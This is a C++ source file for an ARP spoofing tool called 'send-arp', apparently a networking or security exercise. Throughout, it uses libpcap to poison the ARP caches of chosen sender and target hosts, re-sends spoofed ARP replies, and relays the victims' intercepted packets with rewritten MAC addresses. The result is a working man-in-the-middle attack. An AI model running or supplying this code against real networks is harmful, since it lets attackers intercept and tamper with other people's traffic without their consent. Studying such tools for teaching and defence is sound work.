#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <pcap.h>
#include <pcap/pcap.h>
#include <stdlib.h>
#include "ethernet.h"
#include "packet.h"
#include <string>
#include <sys/types.h>
#include <unistd.h>
#include "ethernet.h"
#include "arp.h"
#include "packet.h"
#include "attack.h"
#include "mac.h"
#include "ip.h"
#include "iphdr.h"


void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1");


}
int check_arg(int argc, char*argv){
    if(argc < 4 ){
        usage();
        return EXIT_FAILURE;
    }
    else if((argc % 2 != 0)){
        usage();
        return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}




int main(int argc, char* argv[]) {
    if(check_arg(argc, *argv)){
        return EXIT_FAILURE;
    }


    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    // pcap_t* pcap = pcap_open_live(dev, 0, 0, 0, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return EXIT_FAILURE;
    }

    uint16_t couple = (argc - 2)/2;
    ArpPacket** arpPacket = new ArpPacket*[couple];
    Mac** mac = new Mac*[couple];

    Info** info = new Info*[couple];

    //Attack send -arp
    for(int i=0;i<couple; i++){
        char* sender_ip = argv[i*2 + 2];
        char* target_ip = argv[i*2 + 3];
        mac[i] = (Mac*)malloc(sizeof(Mac));
        arpPacket[i] = attack_arp(dev, Ip(sender_ip) , Ip(target_ip), pcap, mac[i]);
        // arpPacket[i]->print_arp_packet();

        //Set Info
        info[i] = new Info(dev, *arpPacket[i], mac[i]);
        // info[i]->print_info();
    }


    //packet check
    const u_char* packet;
    Ethernet* ethernet ;
    Iphdr* iphdr ;
    uint16_t count = 0;
    while (true) {

        struct pcap_pkthdr* header;
        // printf("\nWHERE");

        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0){
            continue; //time out
        } else if(res <0){ // error
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }



        ethernet = (Ethernet*) packet;
        iphdr = get_ip_header(packet+14);
        // printf("\n\n");
        // ethernet->print_ethernet();
        bool flag = false;
        Mac des_ = ethernet->get_d_mac();
        Mac src_ = ethernet->get_s_mac();
        uint16_t ether_type = ethernet->get_ether_type();
        uint16_t index = 0;

        // printf("broad\n");

        //broadcast -> send arp
        if(des_ == Mac("ff:ff:ff:ff:ff:ff")){
            printf("catch broad\n");
            for(int i=0;i<couple;i++){
                arp_reply(pcap, arpPacket[i]);
            }
            continue;
        }

        // printf("%04x\n", ether_type);
        if(ether_type == 0x0806){
            for(int i=0;i<couple;i++){
                arp_reply(pcap, arpPacket[i]);
            }
            continue;
        }
        // bool temp = false;
        //
        // for(int i=0;i<couple;i++){
        //     if(Ip(iphdr->destination_ip_address) == info[i]->d_ip_ && Ip(iphdr->source_ip_address) == info[i] -> d_ip_){
        //         for(int j=0;j<couple;j++){
        //             arp_reply(pcap, arpPacket[i]);
        //             temp = true;
        //         }
        //         continue;
        //
        //         if(temp){
        //             break;
        //         }
        //
        //     }


        // }




        // printf("hello");

        //source same check
        for(int i=0;i<couple;i++){
            if(src_ == info[i]->s_mac_){
                index = i;
                flag = true;
                break;

            }
        }


        if (flag == true) {
            // printf("SPOOF!!!\n");
            const int len = header->caplen;
            u_char* spoof_packet = (u_char*)malloc(len);
            memcpy(spoof_packet, packet, len);


            Ethernet* spoof_ethernet = (Ethernet*)spoof_packet;
            spoof_ethernet->set_dmac(info[index]->d_mac_.bytes());
            spoof_ethernet->set_smac(info[index]->my_mac_.bytes());

            if(pcap_sendpacket(pcap, (u_char*)spoof_packet , len) !=0){
                printf("ERROR");
                exit(1);
            }

            free(spoof_packet);
        }

        flag = false;




        if(count > 30){
            for(int i=0;i<couple;i++){
                arp_reply(pcap, arpPacket[i]);
            }
            count = 0;

        }

        count ++;
    }




    free(mac);
    free(arpPacket);
    pcap_close(pcap);
}
